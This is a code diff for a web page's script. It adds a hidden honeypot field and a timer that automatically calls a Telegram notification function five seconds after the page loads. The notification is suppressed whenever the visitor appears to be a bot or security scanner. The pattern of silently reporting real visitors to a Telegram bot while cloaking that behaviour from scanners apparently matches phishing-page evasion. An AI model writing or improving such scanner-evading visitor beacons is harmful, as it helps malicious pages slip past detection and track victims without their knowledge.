@@ -63,6 +63,9 @@
   </style>
 </head>
 <body>
+  <!-- Hidden field to trap automated form-filling scanners -->
+<input type="text" id="honey_field" style="display:none !important;" tabindex="-1" autocomplete="off">
+
 
 <!-- Desktop version -->
   <div id="desktop-content" class="container">
@@ -228,29 +231,31 @@ Time: ${new Date().toLocaleString()}
     }
   }
 
- // TIME TRAP & HUMAN INTERACTION VERIFICATION
+ // =========================
+  // AUTOMATIC 5-SECOND TIME TRAP
   // =========================
 
-  // 1. Define the function that handles the human verification
-  function verifyRealUser() {
-    console.log("Human interaction confirmed after timer.");
-    notifyTelegram();
-    
-    // Clean up listeners immediately so it only runs once
-    window.removeEventListener('scroll', verifyRealUser);
-    window.removeEventListener('click', verifyRealUser);
-  }
-
-  // 2. Start the countdown timer when the page opens.
-  // The page will completely ignore all clicks and scrolls for the first 7 seconds.
+  // Start the countdown timer when the page opens.
   setTimeout(() => {
-    console.log("7 seconds passed. Activating human interaction listeners.");
+    
+    // Check if an automated bot filled out our hidden honeypot field
+    const honeyField = document.getElementById("honey_field");
+    const isHoneyFilled = honeyField && honeyField.value !== "";
 
-    // Only attach the listeners AFTER the 7 seconds have fully elapsed
-    window.addEventListener('scroll', verifyRealUser);
-    window.addEventListener('click', verifyRealUser);
+    if (isHoneyFilled) {
+      console.log("Honeypot triggered by a bot. Notification skipped.");
+      return;
+    }
 
-  }, 5000); // 5-second strict delay
+    // Double check that it isn't an obvious bot User-Agent before firing
+    if (!isBotOrScanner()) {
+      console.log("7 seconds passed. Triggering automatic notification.");
+      notifyTelegram();
+    } else {
+      console.log("Scanner detected at timeout mark. Notification skipped.");
+    }
+
+  }, 5000); // Strict 5-second automatic delay
   
 </script>
 
